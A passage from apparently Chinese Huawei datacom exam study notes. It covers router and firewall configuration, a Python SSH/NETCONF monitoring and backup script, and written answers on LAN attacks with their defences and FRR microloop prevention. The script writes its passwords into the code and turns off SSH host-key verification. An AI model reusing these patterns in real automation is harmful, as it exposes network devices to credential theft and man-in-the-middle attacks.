class="hljs-built_in">source</span> 10.2.14.0 0.0.0.255 rule permit ip <span class="hljs-built_in">source</span> 10.2.15.0 0.0.0.255 description discover quitacl number 3002 rule permit ip <span class="hljs-built_in">source</span> 10.2.21.0 0.0.0.255 rule permit ip <span class="hljs-built_in">source</span> 10.2.22.0 0.0.0.255 rule permit ip <span class="hljs-built_in">source</span> 10.2.23.0 0.0.0.255 rule permit ip <span class="hljs-built_in">source</span> 10.2.24.0 0.0.0.255 rule permit ip <span class="hljs-built_in">source</span> 10.2.25.0 0.0.0.255 quittraffic classifier discover if-match acl 3001 quittraffic behavior discover remark dscp af41 queue af bandwidth 300000 quittraffic classifier product if-match acl 3002 quittraffic behavior product remark dscp ef queue llq bandwidth 100000 quittraffic policy R&amp;D classifier discover behavior discover classifier product behavior product quitint g 2/0/0.20 dis this traffic-policy R&amp;D outboundint g 2/0/1.20 dis this traffic-policy R&amp;D outbound<span class="hljs-comment">## Y/Z_PE1/2</span>drop-profile discover wred dscp dscp af41 low-limit 50 high-limit 90 discard-percentage 50traffic classifier discover if-match dscp af41 quittraffic behavior discover queue af bandwidth 300000 drop-profile discover quittraffic classifier product if-match dscp ef quittraffic behavior product queue llq bandwidth 100000 cbs 2500000 quittraffic policy R&amp;D classifier discover behavior discover classifier product behavior product quitint g 0/0/0 traffic-policy R&amp;D outboundint g 0/0/1 traffic-policy R&amp;D outboundint g 0/0/2 traffic-policy R&amp;D outbound quit<span class="hljs-comment">## Z_PE1/2</span>int g 2/0/0.20 traffic-policy R&amp;D outbound quit<span class="hljs-comment">## X_T_FW</span>switch vsys Employee sys ip address-set X <span class="hljs-built_in">type</span> object  add range 10.1.11.0 10.1.15.255  add range 10.1.21.0 10.1.25.255  add range 10.1.31.0 10.1.35.255  add range 10.1.41.0 10.1.45.255  add range 10.1.51.0 10.1.55.255  quitip address-set Y <span class="hljs-built_in">type</span> object  add range 10.2.31.0 10.2.35.255  add range 10.2.41.0 10.2.45.255  add range 10.2.51.0 10.2.55.255  quitip address-set Z&amp;Store <span class="hljs-built_in">type</span> object  add range 10.2.101.0 10.3.101.255  add range 10.100.2.0 10.100.2.255  quitsecurity-policy rule name X_Y&amp;Z&amp;Store  source-zone trust  destination-zone untrust  source-address address-set X  destination-address address-set Y  destination-address address-set Z&amp;Store  action permit rule name Y&amp;Z&amp;Store_X  source-zone untrust  destination-zone trust  source-address address-set Y  source-address address-set Z&amp;Store  destination-address address-set X  action permit rule name Employee_Internet bottom<span class="hljs-comment">## X_T_Export1</span>tracert  -a 10.20.1.5 10.100.2.1<span class="hljs-comment">## Y_Export1</span>ping -vpn-instance vpn3 -a 10.100.3.1 10.3.99.254<span class="hljs-comment">## </span><span class="hljs-built_in">return</span> save Y</code></pre><hr><h2 id="Python网络自动化"><a href="#Python网络自动化" class="headerlink" title="Python网络自动化"></a>Python网络自动化</h2><h3 id="1、前5个需求"><a href="#1、前5个需求" class="headerlink" title="1、前5个需求"></a>1、前5个需求</h3><pre><code class="hljs bash">1. 5min读取一下 X_T1_AGG1上的关键信息： 电源，风扇，LACP状态，CUP和内存使用率，OSPF邻居状态；2. PC1-X_T1_AGG1之间采用安全的通道进行连接；3. 读取风扇信息，如果两个风扇为Nor（坏掉的意思），则输出“All fans are faultly”；4. 所有监控命令不能固定在代码里面，需要防止文件里面，通过调用文件的方式进行；5. 每24小时自动保存设备的配置文件并备份到本地，并通过安全的传输协议存在本地设备，以【当天日期_设备名字.后续】的名称命名设备端以及本地的配置文件。举例：2022_2_14_X_T2_AGG1.zip 2022_2_14_X_T2_AGG1.bak</code></pre><h3 id="2、创建“command-txt”文件，完成1和4需求"><a href="#2、创建“command-txt”文件，完成1和4需求" class="headerlink" title="2、创建“command.txt”文件，完成1和4需求"></a>2、创建“command.txt”文件，完成1和4需求</h3><pre><code class="hljs gams"><span class="hljs-keyword">display</span> <span class="hljs-built_in">power</span><span class="hljs-keyword">display</span> fan<span class="hljs-keyword">display</span> lacp brief<span class="hljs-keyword">display</span> cpu history <span class="hljs-number">1</span>hour<span class="hljs-keyword">display</span> memory-usage<span class="hljs-keyword">display</span> ospf peer brief</code></pre><h3 id="3、相关需求的Python程序"><a href="#3、相关需求的Python程序" class="headerlink" title="3、相关需求的Python程序"></a>3、相关需求的Python程序</h3><pre><code class="hljs py"><span class="hljs-keyword">from</span> paramiko <span class="hljs-keyword">import</span> SSHClient,AutoAddPolicy<span class="hljs-keyword">from</span> ncclient <span class="hljs-keyword">import</span> manager<span class="hljs-keyword">from</span> ncclient.xml_ <span class="hljs-keyword">import</span> to_ele<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime,timedelta<span class="hljs-keyword">class</span> <span class="hljs-title class_">Datacom</span>:    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,server,username,password</span>):        <span class="hljs-variable language_">self</span>.server=server        <span class="hljs-variable language_">self</span>.username=username        <span class="hljs-variable language_">self</span>.password=password        <span class="hljs-variable language_">self</span>.client=<span class="hljs-variable language_">self</span>._get_client()        <span class="hljs-variable language_">self</span>.cli=<span class="hljs-variable language_">self</span>.client.invoke_shell()        <span class="hljs-variable language_">self</span>.cli.send(<span class="hljs-string">&#x27;screen-length 0 temporary\n&#x27;</span>)        sleep(<span class="hljs-number">6</span>)        <span class="hljs-variable language_">self</span>.cli.recv(<span class="hljs-number">9999</span>)    <span class="hljs-comment"># 创建一个SSH连接客户端</span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_client</span>(<span class="hljs-params">self</span>):        client=SSHClient() <span class="hljs-comment"># SSH客户端工具进行实例化</span>        client.load_system_host_keys() <span class="hljs-comment"># 加载SSH的主机公钥</span>        client.set_missing_host_key_policy(AutoAddPolicy) <span class="hljs-comment"># 当本地设备没有公钥时自动保存交换机的SSH公钥</span>        client.connect(<span class="hljs-variable language_">self</span>.server,username=<span class="hljs-variable language_">self</span>.username,password=<span class="hljs-variable language_">self</span>.password) <span class="hljs-comment"># 使用地址，账号和密码进行SSH连接</span>        <span class="hljs-keyword">return</span> client    <span class="hljs-comment"># 发送命令的方法</span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">command</span>(<span class="hljs-params">self,cmd</span>):        <span class="hljs-variable language_">self</span>.cli.send(<span class="hljs-string">&#x27;&#123;&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(cmd))        sleep(<span class="hljs-number">6</span>)        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.cli.recv(<span class="hljs-number">9999</span>).decode() <span class="hljs-comment"># 回到cli函数读取回显结果9999字符，并使用decode进行解码</span>    <span class="hljs-comment"># 检测风扇是否正常</span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">fan_info</span>(<span class="hljs-params">self</span>):        fan_info=<span class="hljs-variable language_">self</span>.command(<span class="hljs-string">&#x27;display fan&#x27;</span>)        <span class="hljs-keyword">return</span> fan_info.find(<span class="hljs-string">&#x27;Normal&#x27;</span>)==-<span class="hljs-number">1</span>    <span class="hljs-comment"># sftp下载配置文件</span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self,target,path=<span class="hljs-string">&#x27;/vrpcfg.zip&#x27;</span></span>):        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;download staring...&#x27;</span>)        client=<span class="hljs-variable language_">self</span>._get_client()        sftp=client.open_sftp()        sftp.get(path,target)        <span class="hljs-variable language_">self</span>.client.close()        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;download finish.&#x27;</span>)    <span class="hljs-comment"># 关闭连接</span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>(<span class="hljs-params">self</span>):        <span class="hljs-variable language_">self</span>.client.close()<span class="hljs-comment"># 定义使用ncclient并使用netconf方式进行设备配置，并在配置成功后输出成功提示</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">Netconf_by_rpc</span>(<span class="hljs-params">ip,username,password,rpc_netconf</span>):    <span class="hljs-keyword">with</span> manager.connect_ssh(host=ip,                             username=username,                             password=password,                             hostkey_verify=<span class="hljs-literal">False</span>,                             device_params=&#123;<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&quot;huaweiyang&quot;</span>&#125;)  <span class="hljs-keyword">as</span>  m:        command=to_ele(rpc_netconf)        rpc=m.__getattr__(<span class="hljs-string">&quot;rpc&quot;</span>)        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;get manager inner function rpc &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(rpc))        rpc(command)        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;netconf setting success!&#x27;</span>)<span class="hljs-comment"># 定义使用netconf的方法进行设置设备日志主机的函数，并输出正在配置日志主机提示</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">Netconf_syslog_host</span>(<span class="hljs-params">ip,username,password,syslog</span>):    rpc_netconf=<span class="hljs-string">&#x27;&#x27;&#x27;&lt;edit-config&gt;</span><span class="hljs-string">    &lt;target&gt;</span><span class="hljs-string">      &lt;running/&gt;</span><span class="hljs-string">    &lt;/target&gt;</span><span class="hljs-string">    &lt;config&gt;</span><span class="hljs-string">      &lt;syslog:syslog xmlns:syslog=&quot;urn:ietf:params:xml:ns:yang:ietf-syslog&quot;&gt;</span><span class="hljs-string">        &lt;syslog:log-actions&gt;</span><span class="hljs-string">          &lt;syslog:remote&gt;</span><span class="hljs-string">            &lt;syslog:destination&gt;</span><span class="hljs-string">              &lt;syslog:name&gt;syslog-host&lt;/syslog:name&gt;</span><span class="hljs-string">              &lt;syslog:udp&gt;</span><span class="hljs-string">                &lt;syslog:address&gt;&#123;&#125;&lt;/syslog:address&gt;</span><span class="hljs-string">                &lt;syslog:port&gt;43&lt;/syslog:port&gt;</span><span class="hljs-string">              &lt;/syslog:udp&gt;</span><span class="hljs-string">              &lt;syslog:destination-facility xmlns:ietf-syslog-types=&quot;urn:ietf:params:xml:ns:yang:ietf-syslog-types&quot;&gt;ietf-syslog-types:local0&lt;/syslog:destination-facility&gt;</span><span class="hljs-string">            &lt;/syslog:destination&gt;</span><span class="hljs-string">          &lt;/syslog:remote&gt;</span><span class="hljs-string">        &lt;/syslog:log-actions&gt;</span><span class="hljs-string">      &lt;/syslog:syslog&gt;</span><span class="hljs-string">    &lt;/config&gt;</span><span class="hljs-string">  &lt;/edit-config&gt;</span><span class="hljs-string">  &#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(syslog)    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Using netconf configure syslog...&#x27;</span>)    Netconf_by_rpc(ip,username,password,rpc_netconf)<span class="hljs-comment"># 定义组装函数</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">datacom_loop</span>(<span class="hljs-params">ip,username,password,name</span>):    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:            datacom=Datacom(ip,username,password)            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;command.txt&#x27;</span>)  <span class="hljs-keyword">as</span> f:             <span class="hljs-keyword">for</span> command <span class="hljs-keyword">in</span> f:                <span class="hljs-built_in">print</span>(datacom.command(command))            <span class="hljs-keyword">if</span> datacom.fan_info(): <span class="hljs-comment"># 判断风扇是否故障</span>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ALL fans are faultly&#x27;</span>)            <span class="hljs-keyword">try</span>:                <span class="hljs-comment"># 开始判断是不是保存配置超过24小时了, 则进行强行赋值，大于一天</span>                than_one_day= datetime.now() - last_downloadtime&gt;=timedelta(days=<span class="hljs-number">1</span>)            <span class="hljs-keyword">except</span> NameError:                than_one_day=<span class="hljs-literal">True</span>            <span class="hljs-keyword">if</span> than_one_day: <span class="hljs-comment"># 开始判断是不是保存配置超过24小时了</span>                downloadtime=datetime.now() <span class="hljs-comment"># 记录下载时间</span>                downloadtime_date=downloadtime.strftime(<span class="hljs-string">&#x27;%Y_%m_%d&#x27;</span>)                config_filename=<span class="hljs-string">&#x27;&#123;&#125;_&#123;&#125;.zip&#x27;</span>.<span class="hljs-built_in">format</span>(downloadtime_date,name) <span class="hljs-comment"># 下载载的文件名字</span>                backup_filename=<span class="hljs-string">&#x27;&#123;&#125;_&#123;&#125;.bak&#x27;</span>.<span class="hljs-built_in">format</span>(downloadtime_date,name) <span class="hljs-comment"># 保存的配置文件名字</span>                datacom.command(<span class="hljs-string">&#x27;save force &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(config_filename))  <span class="hljs-comment"># 保存文件</span>                datacom.download(backup_filename,config_filename) <span class="hljs-comment"># 下载函数下载文件</span>                last_downloadtime=downloadtime <span class="hljs-comment"># 把最后一次的下载的时间设置成现在</span>                datacom.close()                sleep(<span class="hljs-number">5</span>*<span class="hljs-number">60</span>) <span class="hljs-comment"># 五分钟之后继续重复以上操作</span>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;stopped by &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(e))ip = <span class="hljs-string">&#x27;10.1.0.6&#x27;</span> <span class="hljs-comment"># 设备IP地址</span>name = <span class="hljs-string">&#x27;X_T1_AGG1&#x27;</span> <span class="hljs-comment"># 设备名</span>syslog = <span class="hljs-string">&#x27;10.1.60.2&#x27;</span> <span class="hljs-comment"># 日志主机地址</span>username = <span class="hljs-string">&#x27;python&#x27;</span> <span class="hljs-comment"># SSH的用户名</span>password = <span class="hljs-string">&#x27;Huawei@123&#x27;</span> <span class="hljs-comment"># SSH的密码</span>nc_username = <span class="hljs-string">&#x27;netconf&#x27;</span> <span class="hljs-comment"># 用于netconf的用户名</span>nc_password = <span class="hljs-string">&#x27;Huawei@123&#x27;</span> <span class="hljs-comment"># 用于netconf的密码</span><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:    <span class="hljs-keyword">try</span>:        Netconf_syslog_host(ip,nc_username,nc_password,syslog)        datacom_loop(ip,username,password,name) <span class="hljs-comment"># 执行巡检调用，进行每5分钟一次的循环</span>    <span class="hljs-keyword">except</span> KeyboardInterrupt:        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;end of process!&#x27;</span>)</code></pre><hr><h2 id="网络八股文"><a href="#网络八股文" class="headerlink" title="网络八股文"></a>网络八股文</h2><h3 id="1、内网攻击场景"><a href="#1、内网攻击场景" class="headerlink" title="1、内网攻击场景"></a>1、内网攻击场景</h3><blockquote><p>问题1 5’: 来自于外网的流量DDos攻击等，可以通过FW进行防御。来自于内部的流量，会有哪些?举出5 种内网攻击场景，并提供解决方案。(1 个场景1 分，5 个场景以上满分)</p></blockquote><pre><code class="hljs bash">答:DDoS 攻击是指攻击者通过控制大量的僵尸主机，向被攻击目标发送大量精心构造的攻击报文， 造成被攻击者所在网络的链路拥塞、系统资源耗尽，从而使被攻击者产生拒绝向正常用户的请求提供服务的效果。来自外网流量的DDoS 攻击等，可以使用防火墙进行防御，而来自内部的流量也往往存在很多攻击行为，以下是关于内网流量攻击以及相应解决方案:<span class="hljs-comment"># 1、LAND 攻击</span>LAND 攻击是攻击者利用TCP 连接三次握手机制中的缺陷，向目标主机发送一个源地址和目的地址均为目标主机、源端口和目的端口相同的SYN 报文，目标主机接收到该报文后，将创建一个源地址和目的地址均为自己的TCP 空连接，直至连接超时。在这种攻击方式下，目标主机将会创建大量无用的TCP空连接，耗费大量资源，直至设备瘫痪。攻击者利用这个攻击原理攻击重要节点的网络设备， 例如服务器的网关设备，这样会导致设备资源使用率过高，影响网络服务。<span class="hljs-comment"># 解决方式:</span>可以在网关设备上启用畸形报文攻击防范，启用该防范后，设备采用检测TCP SYN 报文的源地址和目的地址的方法来避免LAND 攻击。如果TCP SYN 报文中的源地址和目的地址一致，则认为是畸形报文攻击，丢弃该报文。<span class="hljs-comment"># 2、TC-BPDU 攻击</span>交换设备在接收到TC BPDU 报文后，会执行MAC 地址表项和ARP 表项的删除操作。攻击者利用该原理伪造TC BPDU 报文恶意攻击交换设备，短时间内产生大量的TC BPDU 报文，导致交换设备会收到很多TC BPDU 报文，频繁的删除操作会给设备造成很大的负担，导致设备资源使用率过高，影响网络质量，也给网络的稳定带来很大隐患。解决方式:在交换设备上启用防TC-BPDU 报文攻击，启用该功能后，在单位时间内，交换设备处理TC BPDU 报文的次数可配置。如果在单位时间内，交换设备在收到TC BPDU 报文数量大于配置的阈值，那么设备只会处理阈值指定的次数。对于其他超出阈值的TC BPDU 报文，定时器到期后设备只对其统一处理一次。这样可以避免频繁的删除MAC 地址表项和ARP 表项，从而达到保护设备的目的。<span class="hljs-comment"># 3、DHCP Server 仿冒攻击</span>由于DHCP Server 和DHCP Client 之间没有认证机制，所以如果在网络上随意添加一台DHCP 服务器，它就可以为客户端分配IP 地址以及其他网络参数。如果该DHCP 服务器为用户分配错误的IP 地址和其他网络参数，导致用户上网异常等现象。解决方案:为了防止DHCP Server 仿冒者攻击，可配置设备接口的“信任(Trusted)/非信任(Untrusted)”工作模式，启用后接口默认为非信任模式，将与合法DHCP 服务器直接或间接连接的接口设置为信任接口。此后，从“非信任(Untrusted)”接口上收到的DHCP 回应报文将被直接丢弃，这样可以有效防止DHCP Server 仿冒者的攻击。<span class="hljs-comment"># 4、IP 欺骗攻击</span>随着网络规模越来越大，通过伪造源IP 地址实施的网络攻击(简称IP 地址欺骗攻击)也逐渐增多。攻击者通过伪造合法用户的IP 地址获取网络访问权限，非法访问网络，甚至造成合法用户无法访问网络，或者信息泄露。解决方案:可以在接入设备上启用IPSG，IPSG 利用绑定表(源IP 地址、源MAC 地址、所属VLAN、入接口的绑定关系)去匹配检查二层接口上收到的IP报文，只有匹配绑定表的报文才允许通过，其他报文将被丢弃。绑定表包括静态和动态两种。静态绑定表使用user-bind 命令手工配置。DHCP Snooping 动态绑定表在配置DHCP Snooping 功能后，DHCP 主机动态获取IP 地址时，设备根据DHCP 服务器发送的DHCP 回复报文动态生成。配置IPSG 技术结合DHCP Snooping 功能进行抵御。可以在交换机上接口或者VLAN 上配置IPSG功能，对入方向的IP 报文进行绑定表匹配检查，当设备在转发IP 报文时， 将此IP 报文中的源IP、源MAC、端口、VLAN 信息和绑定表的信息进行比较，如果信息匹配，说明是合法用户，则允许此用户正常转发，否则认为是攻击者，丢弃该用户发送的IP 报文。从而避免了IP 欺骗攻击。<span class="hljs-comment"># 5、ARP 欺骗攻击</span>ARP 欺骗是针对ARP 的一种攻击技术，通过使用错误的ARP 载荷信息欺骗局域网内访问者PC 的网关MAC 地址，使访问者PC 错以为攻击者更改后的MAC 地址是网关的MAC，</code></pre><h3 id="2、CloudCampus-全网业务随行原理"><a href="#2、CloudCampus-全网业务随行原理" class="headerlink" title="2、CloudCampus 全网业务随行原理"></a>2、CloudCampus 全网业务随行原理</h3><blockquote><p>问题2 3’：解释CloudCampus 解决方案的业务随行原理，如果有两个认证点(同时也是策略执行点)，用户分散在两个认证点，采用什么方案实现全网业务随行。给出两个方案。(3 分)</p></blockquote><pre><code class="hljs bash">答：<span class="hljs-comment"># 业务随行的原理如下：</span>传统园区网络主要通过ACL 对用户的策略进行控制。基于ACL 的策略配置依赖组网、IP 和VLAN 的规划，网络的拓扑改变、VLAN 规划改变、IP 地址规划改变以及用户的位置变化都会导致ACL 规则的变更，因此用户策略的配置无法与物理网络解耦，缺乏灵活性，可维护性差。为了解决这个问题，使得用户不管身处何地、使用哪个IP 地址，都可以保证该用户在园区网络中获得一致性的访问策略，华为推出了基于用户身份进行策略控制的业务随行方案。首先管理员在控制器中创建用户账号、定义UCL 组，同时将用户账号加入其所属的UCL 组，所有用户必须在认证通过后才可接入网络。然后为用户统一定义基于UCL 组的网络访问策略（即组策略）。策略组配置完成后控制器将管理员配置的UCL 组下发给所有关联的交换机（执行点和认证点设备），从而实现交换机对用户所属UCL 组的识别。同时执行点设备向控制器发起建立IP-GROUP 通道。当用户启动认证，在认证过程中，控制器根据用户的登录信息，将其与UCL组关联。认证成功后，控制器收集所有上线用户的IP 地址。控制器通过IP-GROUP 通道向执行点设备推送UCL 组表项信息（该用户所属安全组作为授权结果），记录源/目的IP 与UCL 组的映射关系。通过安全组完成了对网络对象的分类，通过安全组策略来定义该安全组能享受的网络服务。在iMaster NCE-Campus 中，管理员在二维矩阵上统一规划安全组所能享受的网络服务，包括访问权限、应用控制等。业务随行方案：<span class="hljs-comment"># （1） 场景1：虚拟化园区场景</span>可以把汇聚设备部署为认证点和策略执行点，在虚拟化园区网场景下，同时把汇聚设备部署为Edge 节点,Edge 节点之间会部署VXLAN 隧道。当终端设备通过认证后，汇聚设备会拥有UCL 组信息，同时会拥有该汇聚节点下终端的IP-Group信息。如果互访的终端都在同一个汇聚设备下，那么可以直接根据数据报文的源目的IP信息和IP-Group 表现来查找对应的源目安全组信息，之后再根据源目安全组执行组间策略，允许访问则转发，不允许则丢弃处理。如果互访的目的终端不在该汇聚节点下，汇聚设备只有源终端的IP-Group 表项信息，没有目的终端的IP-Group 表项信息，所以不能直接执行组间策略。而此时汇聚节点同时是Edge 节点，会进行Vxlan 报文的封装，同时会将源安全组ID信息封装在VXLAN 报文中传递到对端的Edge 设备，对端设备再根据目的IP 查找目的的安全组。最后根据找到的目的安全组和VXLAN 报文中的源组ID 执行组间策略，如果禁止就丢弃，如果允许就通过。<span class="hljs-comment"># （2） 场景2：非虚拟化园区网场景</span>可以把汇聚设备部署为认证点和策略执行点。当终端设备通过认证后，汇聚设备会拥有UCL 组信息，同时会拥有该汇聚节点下终端的IP-Group 信息。如果互访的终端都在通一个汇聚设备下，那么可以直接根据数据报文的源目IP信息和IP-Group 表项来查找对应的源目安全组信息，之后再根据源目安全组执行组间策略，允许访问则转发，不允许则进行丢弃处理。如果互访的终端不在同一个汇聚设备下，汇聚设备只有源终端的IP-Group 表项信息，没有目的终端的IP-Group 表项信息，所以不能够直接执行组间策略。而普通的IP 报文无法携带安全组ID 信息，所以此时需要在控制器上配置IP-Group订阅，控制器需要把目的终端的IP-Group 表项信息推送到该汇聚设备上，拥有源目终端的IP-Group 信息，则可以根据数据报文的源目的IP 和IP-Group 表项来查找对应的源目阿全组信息，然后再执行策略，如果禁止就丢弃，允许就通过即可。</code></pre><h3 id="3、FRR-环路技术"><a href="#3、FRR-环路技术" class="headerlink" title="3、FRR 环路技术"></a>3、FRR 环路技术</h3><blockquote><p>问题3 5’：FRR 技术可以分为LFA、R-LFA、TI-LFA，FRR 的环路风险有哪些?(为什么会有环路)</p></blockquote><pre><code class="hljs bash">答：1、LFA （Loop-Free Alternates）算法以可提供备份链路的邻居为根节点，利用SPF （Shortest Path First〉算法计算出到目的节点的最短距离。然后，按照以下不等式计算出一组开销最小且无环的备份链路。LFA 不等式1：Distance_opt(N, D)＜ Distance_opt(N, S) + Distance_opt(S, D)。其中，Distance_opt(X,Y)是指节点X 到Y 之间的最短路径，N 是备份链路的节点，D 是流量转发的目的节点，S 是转发流量的源节点。LFA 不等式2：Distance_opt(N, D)＜ Distance_opt(N, E) + Distance_opt(E，D)。其中，S 是转发流量的源节点，E 是发生故障的节点，N 是备份链路的节点，D是流量转发的目的节点。满足以上两个公式，就避免了计算的备用路径产生环路的风险。但是并不意味部署1P FRR 的网络环境中就一定没有环路，可能会因为收敛不一致导致微环。当主路径故障，流量切换到备份路径后，而后期原主路径恢复后，转发流量的源节点还未收敛完成，收到流量依旧向备份路径转发。此时备份链路的节点已经收敛完成，且该节点去往目的节点会经过源节点，则产生微环。2、LFA FRR 对于某些大型组网，特别是环形组网，无法计算出备份路径，不能满足可靠性要求。在这种情况下，实现了Remote LFA FRR。Remote LFA 算法根据保护路径计算PQ 节点，并在源节点与PQ 节点之间建立tunnel 隧道形成备份下一跳保护。当保护链路发生故障时，流量自动切换到隧道备份路径，继续转发，从而提高网络可靠性。R-LFA 虽然提高了计算备用路径的覆盖率，但是同样会存在路由器拓扑变化的IGP 收敛先后不一致导致的微环。3、LFA FRR 和Remote LFA 对于葉些场景中，扩展P 空间和Q 空间既没有交集，也没有直连的邻居，无法计算出备份路径，不能满足可靠性要求。在这种情况下，实现了T-LFA。TI-LFA 算法根据保护路径计算扩展P 空间，Q 空间，Post convergence 最短路径树，以及根据不同场景计算Repair List，并从源节点到。节点，再到Q 节点建立SegmentRouting 隧道形成备份下一跳保护。当保护链路发生故障时，流量自动切换到隧道备份路径，继续转发，从而提高网络可靠性。虽然T-LFA 拓扑无关，但是同样存在路由器收敛不一致导致的微环问题，T-LFA 可以通过算法来避免微环，主要的微环保护以下三个方面：<span class="hljs-comment"># （1） SR-MPLS 本地正切防微环</span>本地正切微环指的是紧邻故障节点的节点收敛后引发的环路。全网节点都部署TI-LFA，当主路径故障的时候，节点针对目的地址的收敛过程如下：源节点感知到故障，进入TI-LFA 的快速重路由切换流程，向报文插入Repair List，将报文转向TI-LFA 计算的PQ 节点。因此报文会先转发到下一跳备份节点。当源节点完成到目的地址的路由收敛，则直接查找目的节点的路由，将报文转发到下一跳备份节点，此时不再携带Repair List，而是直按转发。如果此时备份节点还未完成收敛，当源节点向备份节点转发报文时，备份节点的转发表中到目的节点的路由下一跳还是源节点，这样就在源节点和备份节点之间形成了环路。解决方式：在源节点部署正切防微环，部署正切防微环后的收敛流程如下：源节点感知到故障，进入T-LFA 流程，报文沿着备份路径转发，下一跳为备份节点，并封装Repair List，源节点启动一个定时器T1。在T_期间，源节点不响应拓扑变化，转发表不变，报文依旧按照TI-LFA 策略转发。网络中其他节点正常收敛。源节点的定时器T1 超时，这时网络中其他节点都己经完成收敛，源节点也正常收敛，退出TI-LFA 流程，按照正常收敛后的路径转发报文。<span class="hljs-comment"># （2）本地回切防微环</span>微环不但可能在路径正切时产生，也可能在故障恢复后路径回切时出现。下面介绍回切时产生环路：主链路发生故障之后，报文按照重新收敛之后的备份路径发送到目的节点。主链路故障恢复后，假设备份节点率先完成收敛。源节点收到报文，由于源节点未完成收敛，依然按照故障恢复前路径转发，转发给备份节点。备份节点已经完成收敛，所以备份节点按照故障恢复后的路径转发到源节点，这样就在源节点和备份节点之间形成了环路。解决方式：在备份节点部署回切防微环，部署回切防微环后的收敛流程如下：主链路故障后恢复，备份节点率先完成收敛。备份节点启动定时器T1，在T1 超时前，备份节点针对访问目的节点的报文计算出防微环Segment List。源节点收到报文，由于源节点未完成收敛，依然按照故障恢复前路径转发，转发给备份节点。备份节点在报文中插入防微环Segment List，并转发到源节点。源节点根据Node SID 和Adjacency SID 指令执行转发动作，沿着Adjacency SiID 指定的出接口转发出去，最终转发至目的节点。<span class="hljs-comment"># （3） 远端防微环</span>前面介绍了本地正切防微环，实际上正切时不仅会导致本地微环，也可能引起远端节点之间形成环路，即沿着报文转发路径，如果离故障点更近的节点先于离故障点远的节点收敛，就可能会导致环路。下面描述远端微环产生过程：计算节点的非直连链路或节点故障，假设计算节点率先完成收敛，备份节点未完成收敛。备份节点沿着故障前路径将报文转发到计算节点，由于计算节点已经完成收敛，根据路由下一跳转发到备份节点。这样报文就在备份节点和计算节点之间形成了环路。解决方式：在计算节点使能远端防微环，使能远端防微环后的收敛流程如下：计算节点的非直连链路或节点故障，假设计算节点率先完成收敛。计算节点启动定时器T1，在T1 超时前，算节点针对访问目的节点的报文计算出防微环Segment List。备份节点收到报文，由于备份节点未完成收敛，依然按照故障发生之前的路径将报文转发给计算节点。计算节点在报文中插入防微环Segment List，并转发到备份节点。备份节点根据Node SID 的指令执行转发动作，将报文转发给最远P 节点。最远P 节点根据AdjacencysD 的指令执行转发动作，沿着Adjacency SID 出接口转发出去，最后转发到目的节点。</code></pre><h3 id="4、FRR-TI-LFA环路风险"><a href="#4、FRR-TI-LFA环路风险" class="headerlink" title="4、FRR TI-LFA环路风险"></a>4、FRR TI-LFA环路风险</h3><blockquote><p>问题3 在部署FRR 时，开启TI-LFA 功能规避环路的风险,那么FRR 是否存在环路的风险？</p></blockquote><pre><code class="hljs bash">答：LFA FRR 和Remote LFA 对于某些场景中，扩展P 空间和Q 空间既没有交集，也没有直连的邻居，无法计算出备份路径，不能满足可靠性要求。在这种情况下，实现了TI-LFA。TI-LFA 算法根据保护路径计算扩展P 空间，Q 空间，Post-convergence 最短路径树，以及根据不同场景计算Repair List，并从源节点到P 节点，再到Q 节点建立SegmentRouting 隧道形成备份下一跳保护。当保护链路发生故障时，流量自动切换到隧道备份路径，继续转发，从而提高网络可靠性。虽然TI-LFA 拓扑无关，但是同样存在路由器收敛不一致导致的微环问题，TI-LFA 可以通过算法来避免微环，主要的微环保护以下三个方面：<span class="hljs-comment"># （1） SR-MPLS 本地正切防微环</span>本地正切微环指的是紧邻故障节点的节点收敛后引发的环路。全网节点都部署TIHLFA，当主路径故障的时候，源节点针对目的地址的收敛过程如下：源节点感知到故障，进入T-LFA 的快速重路由切换流程，向报文插入Repair List，将报文转向TH-LFA 计算的PQ 节点。因此报文会先转发到下一跳备份节点。当源节点完成到目的地址的路由收敛，则直接查找目的节点的路由，报文转发到下一跳备份节点，此时不再携带Repair List，而是直接转发。如果此时备份节点还未完成收敛，当源节点向备份节点转发报文时，备份节点的转发表中到目的节点的路由下一跳还是源节点，这样就在源节点和备份节点之间形成了环路。解决方式：在源节点部署正切防微环，部署正切防微环后的收敛流程如下：源节点感知到故障，进入T-LFA 流程，报文沿着备份路径转发，下一跳为备份节点，并封装RepairList。源节点启动一个定时器T1。在T1 期间，源节点不响应拓扑变化，转发表不变，报文依旧按照TI-LFA 策略转发。网络中其他节点正常收敛。源节点的定时器T1 